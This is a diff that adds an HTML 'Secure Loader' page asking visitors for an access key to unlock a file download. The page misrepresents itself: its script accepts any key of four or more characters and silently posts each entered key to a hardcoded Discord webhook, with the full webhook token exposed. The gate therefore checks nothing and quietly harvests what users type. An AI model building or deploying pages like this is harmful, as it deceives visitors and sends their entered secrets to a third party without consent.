@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Loader</title>
+  <style>
+    body {
+      background-color: #1a1a1a;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 16px;
+    }
+    a {
+      color: #00ffcc;
+      text-decoration: none;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Key-Based Loader</h1>
+  <p>Enter your access key to unlock the download</p>
+
+  <input type="text" id="keyInput" placeholder="Enter key here">
+  <button onclick="submitKey()">Unlock</button>
+
+  <div id="downloadSection" style="display:none; margin-top:20px;">
+    <p>✅ Key accepted!</p>
+    <a href="yourfile.zip" download>📦 Download File</a>
+  </div>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1397862831730462833/3ZchpVYVF_gpSfFrIsr52Dr57p0Qd-qx252TEEX67K70P8aUBgWLMp9sBt2aEc8SCDot";
+
+    function submitKey() {
+      const key = document.getElementById("keyInput").value.trim();
+
+      if (!key || key.length < 4) {
+        alert("Invalid key.");
+        return;
+      }
+
+      // Send to Discord webhook
+      fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🔑 New key used: \`${key}\``
+        })
+      }).catch(err => console.error("Webhook error:", err));
+
+      // Show download section
+      document.getElementById("downloadSection").style.display = "block";
+    }
+  </script>
+</body>
+</html>
